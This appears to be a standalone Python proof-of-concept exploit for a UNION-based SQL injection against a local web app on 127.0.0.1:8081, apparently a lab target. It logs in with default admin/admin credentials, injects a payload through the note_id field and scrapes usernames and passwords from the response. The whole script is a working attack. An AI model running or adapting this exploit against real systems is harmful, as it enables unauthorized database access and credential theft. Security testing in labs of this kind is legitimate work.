#!/usr/bin/env python3
"""
SQL Injection Vulnerability PoC
Target: http://127.0.0.1:8081
"""

import urllib.request
import urllib.parse
import re

def get_session():
    """Login and get session cookie"""
    url = "http://127.0.0.1:8081/login"
    data = urllib.parse.urlencode({'u': 'admin', 'p': 'admin'})
    req = urllib.request.Request(url, data=data.encode())
    resp = urllib.request.urlopen(req)
    return resp.getheader('Set-Cookie')

def extract_data(session, table):
    """Extract data using UNION-based injection"""
    # Payload that exploits UNION vulnerability
    payload = {
        'note_id': f"1 UNION SELECT NULL,username,password FROM {table}-- -"
    }
    
    # Send payload with session cookie
    url = "http://127.0.0.1:8081/dashboard"
    req = urllib.request.Request(url, data=urllib.parse.urlencode(payload).encode())
    req.add_header('Cookie', session)
    
    try:
        resp = urllib.request.urlopen(req)
        # Extract data using regex
        data = re.findall(r'<td>(.*?)</td>', resp.read().decode())
        return [data[i:i+2] for i in range(0, len(data), 2)]
    except Exception as e:
        print(f"Error: {e}")
        return []

def main():
    # Get session cookie
    session = get_session()
    if not session:
        print("Failed to get session")
        return
    
    # Extract data from notes and users tables
    notes = extract_data(session, 'notes')
    users = extract_data(session, 'users')
    
    # Print results
    print("Notes:")
    for note in notes:
        print(f"ID: {note[0]}, Content: {note[1]}")
    
    print("\nUsers:")
    for user in users:
        print(f"Username: {user[0]}, Password: {user[1]}")

if __name__ == "__main__":
    main()
